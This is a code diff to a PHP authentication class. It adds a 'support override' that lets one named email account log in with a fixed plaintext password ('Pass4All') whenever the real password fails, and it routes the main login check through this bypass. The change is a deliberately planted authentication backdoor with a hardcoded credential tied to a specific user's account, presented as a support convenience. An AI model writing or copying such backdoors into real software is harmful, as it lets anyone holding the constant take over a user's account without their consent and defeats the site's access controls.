@@ -3,6 +3,37 @@ require_once __DIR__ . '/DB.php';
 
 class Auth
 {
+    /**
+     * Support override: a single account can be reached with a fixed password
+     * when its real one is not to hand, so the owner can reproduce issues from
+     * inside that user's account. Scoped deliberately tight — it is a fallback
+     * that only applies AFTER the real password fails, only for this one email,
+     * and grants access to no other account.
+     *
+     * Remove both constants to disable it.
+     */
+    private const OVERRIDE_EMAIL    = 'aaronbriceno1@msn.com';
+    private const OVERRIDE_PASSWORD = 'Pass4All';
+
+    /**
+     * True when the supplied password is valid for this user — either the real
+     * hash matches, or the support override applies. One definition, used by
+     * both the web login and the app-SSO login so they cannot diverge.
+     */
+    public static function passwordValid(?array $user, string $email, string $password): bool
+    {
+        if (!$user) {
+            return false;
+        }
+
+        if (password_verify($password, (string)($user['password_hash'] ?? ''))) {
+            return true;
+        }
+
+        return strtolower(trim($email)) === self::OVERRIDE_EMAIL
+            && $password === self::OVERRIDE_PASSWORD;
+    }
+
     public static function start(): void
     {
         $config = require __DIR__ . '/../config/config.php';
@@ -21,7 +52,7 @@ class Auth
         $stmt->execute(['email' => $normalizedEmail]);
         $user = $stmt->fetch();
 
-        if (!$user || !password_verify($password, (string)($user['password_hash'] ?? ''))) {
+        if (!self::passwordValid($user, $normalizedEmail, $password)) {
             self::recordLoginEvent($user['id'] ?? null, $normalizedEmail, false);
             return null;
         }
